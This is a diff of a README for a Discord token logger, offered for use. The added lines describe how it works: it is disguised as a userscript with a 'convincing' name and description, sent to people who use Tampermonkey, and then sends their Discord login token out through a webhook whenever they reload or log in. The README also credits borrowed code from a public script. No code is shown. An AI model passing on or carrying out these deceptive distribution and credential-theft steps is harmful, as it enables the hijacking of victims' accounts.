@@ -6,3 +6,8 @@ a really lame token logger for discord lol
 2. copy the code you got, then make a github repo with whatever name, and add a file called `yourpluginname.user.js`
 3. **make the plugin name and description convincing!**
 4. copy the raw file link, and send it to someone with tampermonkey lol
+5. now everytime they reload discord or login to an account it'll send the token via a webhook!
+
+> some acknowledgements i should have added: **this includes code from** [this script](https://greasyfork.org/en/scripts/395741-get-discord-token)
+
+why, you may ask? well if the code already exists, why rewrite it when i can borrow it. (thanks brendan)
